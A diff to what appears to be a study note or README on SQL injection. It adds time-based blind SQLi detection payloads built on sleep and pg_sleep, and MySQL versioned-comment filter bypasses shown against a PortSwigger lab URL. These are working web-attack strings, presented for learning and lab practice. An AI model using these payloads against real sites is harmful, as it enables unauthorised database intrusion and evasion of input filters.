@@ -45,19 +45,9 @@ Analyze the image and notice in the <mark>bottom right</mark> that the server re
 
 <img width="1907" height="690" alt="sqli-detection-time-based-proof-of-concept" src="https://github.com/user-attachments/assets/4c216b94-8e8e-4f9a-b836-7499ef6e1c9a" />
 
+<h1>Detection Techniques And Payloads</h1>
 
-
-<h1>Great SQL Injection Resources</h1>
-
-https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main
-
-https://portswigger.net/web-security/sql-injection/cheat-sheet
-
-https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli
-
-https://portswigger.net/web-security/all-labs#sql-injection
-
-<h1>Time-Based SQL Injection Detection Payloads</h1>
+<h2>Time-Based SQLi Detection Payloads</h2>
 
 ```
 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
@@ -99,6 +89,48 @@ select 4564 from pg_sleep(10)--
 desc, (select*from(select(sleep(10)))a)
 -1' or 1=(select 1 from(select(sleep(10))a))a
 ```
+
+<h1>SQL Injection Filter Bypass Techniques</h1>
+
+<img width="1754" height="666" alt="sqli-filter-bypasses" src="https://github.com/user-attachments/assets/88e62808-6196-4739-83d1-65d26e419607" />
+
+<h2>MySQL Specific Comment Syntax</h2>
+
+https://dev.mysql.com/doc/refman/8.4/en/comments.html
+
+<h2>MySQL Inline Versioned Comments</h2>
+
+syntax -
+
+/*!VERSION SQL_code */
+
+EXAMPLE(s): 
+
+1. https://0acc006f04c8264280b0851e00ca00e0.web-security-academy.net/filter?category=Pets'union/*!12345Select*/null,/*!12345sleep*/(10);--+
+
+   deobfuscated-query: Pets'union select null,sleep(10);--+
+
+
+2. https://0acc006f04c8264280b0851e00ca00e0.web-security-academy.net/filter?category=Pets'union/*!31337Select+null,*//*!31337sleep*/(10);--+
+
+   deobfuscated-query: Pets'union select null,sleep(10);--+
+
+
+<h1>Boolean Operator Truth Tables</h1>
+
+<img width="1173" height="681" alt="boolean-truth-tables" src="https://github.com/user-attachments/assets/5432fd19-07a7-440c-8f5a-2c3917d86a66" />
+
+
+<h1>Great SQL Injection Resources</h1>
+
+https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli
+
+https://portswigger.net/web-security/all-labs#sql-injection
+
 
 <h1>To Be Continued</h1>
 
